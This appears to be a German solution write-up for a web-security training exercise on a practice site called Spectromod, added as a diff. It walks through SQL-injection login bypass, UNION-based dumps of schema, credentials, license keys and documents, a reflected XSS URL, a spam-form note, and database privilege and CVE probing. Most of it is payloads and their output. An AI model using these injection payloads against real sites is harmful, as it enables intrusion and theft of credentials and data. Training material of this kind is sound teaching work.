@@ -1,0 +1,160 @@
+
+== Übung Spectromod
+
+=== URL Manipulation
+Der noch nicht veröffentlichte Geschäftsbericht ist unter der URL verfügbar.
+
+    https://www.spectromod.ch/schulung/spectromod/downloads/geschaeftsbericht-2011.doc
+
+=== Lizenzschlüssel:
+
+* Login via SQL-Injection mit Benutername und Passwort: test' or '1' = '1
+* Der Loginstate wird auf 1 gesetzt. Danach mit admin anmelden.
+* Passwort mit Brute-Force und SQL-Injection via Python-Script suchen. Resultat: admin/ADMIN
+
+    Suprex GmbH: ACX21-KVA12-QXZ22-BER98
+    Kantons Labor Zuerich: HAK00-VIR39-CVB12-LKE93
+    Radix AG: FER11-LOB91-QIP76-LIP18
+    Labor Analysen AG: KAP78-MIA98-AVK56-SIA18
+
+
+=== Kundendaten
+
+* Auslesen via SQL-Injection im Download-Bereich
+.  SQL Injection:
+
+   a' OR '1%' = '1
+
+. UNION auf SQL Injection
+
+   a' OR '1' = '1' UNION SELECT 1, 'Test', 'http://www.test.com' from information_schema.tables WHERE  '1%' = '1
+
+. Informationen über SQL Schema
+
+   ' UNION SELECT concat(table_schema, '.', table_name), '', 1 from information_schema.tables WHERE  '1%' = '1
+
+. Alle Spectromod User und Passwörter auslesen
+
+   ' UNION SELECT concat(user, ' - ', password), '', 1 from spectromod.customer WHERE  '1%' = '1
+
+    admin - ADMIN
+    Suprex - e2fc714c47
+    KtLaborZH - loewe
+    Radix - winter2012
+    LabAn - LabAn2011
+    andrea.leuenberger - rOPaL10
+    peter.sturm - ORox311%KV
+
+=== Baupläne
+
+* Auslesen via SQL-Injection im Download Bereich
+
+. Alle Tabellen auslesen
+
+    ' UNION SELECT concat(table_schema, '.', table_name), '', 1 from information_schema.tables WHERE  '1%' = '1
+
+. Alle Spalten der Tablle document auslesen
+
+    ' UNION SELECT COLUMN_NAME, '', 1 from information_schema.columns where table_name = 'document' and '1%' = '1
+
+     id
+     title
+     filename
+     type
+
+. Alle Dokumente auslesen
+
+    a' UNION SELECT concat(id, ' - ', title, ' - ', filename, ' - ', type), '', 1 from document where '1%' = '1
+
+    1 - Preisliste - preisliste-2010.xls - public
+    2 - Geschaeftsbericht 2009 - geschaeftsbericht-2009.pdf - public
+    3 - Organigramm - organigramm.pdf - public
+    4 - IT-Netzwerk - netzwerk_001.pdf - internal
+    6 - Platine Spectromod MASS 50 DX - platine.pdf - secret
+    7 - Lohnliste - loehne.xls - internal
+    8 - Geschaeftsbericht 2010 - geschaeftsbericht-2010.doc - public
+    9 - Referenzen - referenzen.doc - public
+    10 - Backup Notiz - datenbank-backup.pdf - internal
+    11 - Brief Kundenplattform - welcome.doc - internal
+    12 - Geschaeftsbericht2013 - geschaeftsbericht-2013.doc - intern
+
+Platine ist unter https://www.spectromod.ch/schulung/spectromod/downloads/platine.pdf
+Netzwerk ist unter https://www.spectromod.ch/schulung/spectromod/downloads/netzwerk_001.pdf
+
+=== E-Mail
+
+* Auslesen aller Kunden via SQL-Injection im Download Bereich
+
+. Alle Tabellen auslesen
+
+    ' UNION SELECT concat(table_schema, '.', table_name), '', 1 from information_schema.tables WHERE  '1%' = '1
+
+. Alle Spalten der Tablle document auslesen
+
+    ' UNION SELECT COLUMN_NAME, '', 1 from information_schema.columns where table_name = 'customer' and '1%' = '1
+
+    id
+    customer
+    user
+    email
+    password
+    key
+
+. Admin E-Mail auslesen
+
+   ' UNION SELECT concat(email, ' - ', password), '', 1 from spectromod.customer WHERE user = 'admin' AND '1%' = '1
+
+    admin@spectromod.ch
+
+
+=== XSS
+
+     https://www.spectromod.ch/schulung/spectromod/content/index.php?id=1&image=%22%3E%3C/img%3E%3Cscript%3Ealert(%27hello%27);%3C/script%3E%3Cimg%20src=%22
+
+
+=== Spam
+
+* Post-Request mit Parameter name, email, subject, message via Python Script auf https://www.spectromod.ch/schulung/spectromod/kontakt/do-mail.php
+
+== Weitere Versuche
+
+*  Auslesen via SQL-Injection im Download Bereich
+
+
+. MySQL User auslesen
+
+  ' UNION SELECT user(), '', 1 from DUAL WHERE '1%' = '1
+
+  myspectromod@localhost
+
+. Versuch alle MySQL-User auszulesen und an Root Rechte zu kommen
+
+    ' UNION SELECT CONCAT(QUOTE(user),'@',QUOTE(host)), '', 1 from mysql.user WHERE  '1%' = '1
+
+    Funktioniert nicht. Zu wenig Privilegien
+
+. MySQL Privilegien des Benutzers myspectromod auslesen
+
+  ' UNION SELECT concat(grantee, ' - ',  privilege_type, ' - ', is_grantable), '', 1 FROM information_schema.user_privileges WHERE '1%' = '1
+
+    USAGE (no privileges).
+
+. MySQL Version auslesen
+
+    ' UNION SELECT @@version, '', 1 from DUAL WHERE '1%' = '1
+
+    5.5.49-MariaDB-1ubuntu0.14.04.1
+
+. Check ob die Version irgenwelche Sicherheitslücken hat
+
+    https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-3477
+
+    Version 5.5.49 hat eine Sicherheitslücke mit CVSS Score 7.2 die mit 5.5.50 repariert wurde.
+    MariaDB 5.5.50 Erscheinungsdatum ist 2016-06-17, MariaDB 5.5.49 am 2016-04-22.
+
+    Im Git im Branch 5.5 Commits zwischen diesem Zeitraum überprüfen.
+    https://github.com/MariaDB/server/commits/5.5
+
+    Kandidat:
+    https://github.com/MariaDB/server/commit/9d72fb4af0d87f6a69a3ccb9202b4029acf2bd56
+
